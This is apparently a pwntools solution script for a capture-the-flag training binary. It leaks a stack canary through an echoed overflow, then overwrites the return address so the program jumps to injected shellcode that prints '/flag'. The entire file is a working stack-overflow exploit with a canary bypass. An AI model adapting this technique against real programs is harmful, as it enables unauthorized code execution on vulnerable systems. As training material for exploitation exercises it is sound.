from pwn import *

context.arch = 'amd64'

elf = ELF("/challenge/toddlerone-level-4-0")

buff_offset = int("78", 16)
val_18 = p64(int("1083476279f881ba", 16))
shellcode = asm(shellcraft.cat("/flag"))

io = elf.process()

k = b"REPEAT"
p1 = k + b'A'*(buff_offset - int("10",16) - len(k) + 1)

io.sendline(f"{len(p1)}")
io.sendline(p1)

io.recvuntil(p1)
can = io.recvuntil(b'\n')
can = b"\x00" + can[:7]

io.recvuntil("The input buffer begins at 0x")
buff_add = p64(int(io.recvuntil(b',').decode()[:-1], 16))

p2 = shellcode + b'A'*(buff_offset - int("18",16) - len(shellcode)) + val_18 + can + b'B'*8 + buff_add

io.sendline(f"{len(p2)}")
io.sendline(p2)

io.interactive()
